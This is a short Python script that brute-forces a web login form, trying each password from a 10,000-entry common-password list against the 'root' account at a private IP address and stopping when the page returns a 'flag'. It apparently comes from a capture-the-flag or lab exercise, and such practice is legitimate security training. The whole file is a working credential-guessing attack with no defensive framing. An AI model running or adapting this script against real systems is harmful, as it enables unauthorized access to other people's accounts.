import requests

input_file = "10k_most_common.txt"

with open(input_file, 'r') as file:
    for line in file:
        password = line.strip()
        print("Trying : ", password)
        url = f"http://172.20.10.2/?page=signin&username=root&password={password}&Login=Login"
        
        try:
            response = requests.get(url)
            if "flag" in response.text:
                print(f"Found password: {password}")
                print(response.text)
                break
        except requests.RequestException as e:
            print(f"Error: {e}")

print("Finished checking passwords.")